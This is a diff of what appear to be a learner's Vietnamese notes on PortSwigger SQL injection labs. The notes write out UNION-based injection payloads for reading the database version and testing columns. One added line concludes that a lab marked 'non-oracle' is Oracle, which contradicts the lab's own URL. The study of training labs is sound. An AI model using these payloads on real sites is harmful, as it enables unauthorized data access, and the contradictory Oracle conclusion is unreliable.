@@ -182,4 +182,8 @@ Bài 4 : https://portswigger.net/web-security/sql-injection/examining-the-databa
     => '+UNION+SELECT+@@version,+NULL#
         @@version là của Mysql nhé 
 
-            
+Bài 5 : https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+    Bài này gợi ý là UNION attack
+        -> Ta đã học đc 2 bài UNION khác nhau -> thử payload 
+            '+UNION+SELECT+'abc','def'--
+                -> Đây là oracle -> lấy các câu truy vấn liên quan oracle 
